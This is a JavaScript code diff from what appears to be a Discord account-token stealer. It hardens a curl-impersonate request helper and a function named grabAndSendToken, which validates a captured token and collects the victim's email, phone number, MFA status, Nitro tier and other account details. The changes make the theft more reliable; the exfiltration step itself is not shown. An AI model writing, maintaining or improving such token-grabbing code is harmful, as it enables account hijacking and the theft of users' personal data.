@@ -180,7 +180,7 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
 
     const stdout = [];
     const stderr = [];
-    const child = spawn(binary, args, { timeout: timeoutMs + 5000 });
+    const child = spawn(binary, args, { timeout: timeoutMs + 5000, killSignal: 'SIGKILL' });
     child.stdout.on('data', chunk => stdout.push(chunk));
     child.stderr.on('data', chunk => stderr.push(chunk));
 
@@ -247,7 +247,7 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
       }
 
       let data = null;
-      try { data = JSON.parse(bodyBuffer.toString()); } catch(e) {}
+      try { data = JSON.parse(bodyBuffer.toString().trim()); } catch(e) {}
       resolve({ status: lastStatusCode, headers: lastHeadersText, body: bodyBuffer, data });
     });
     child.on('error', (err) => {
@@ -1145,7 +1145,8 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
       10000
     );
 
-    if (!validateRes.data) { return { success: false, error: 'Invalid token' }; }
+    if (validateRes.status === 401 || validateRes.status === 403) { return { success: false, error: 'Invalid token' }; }
+    if (validateRes.status < 200 || validateRes.status >= 300 || !validateRes.data) { return { success: false, error: 'Invalid token' }; }
 
     const userData = validateRes.data;
     const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };
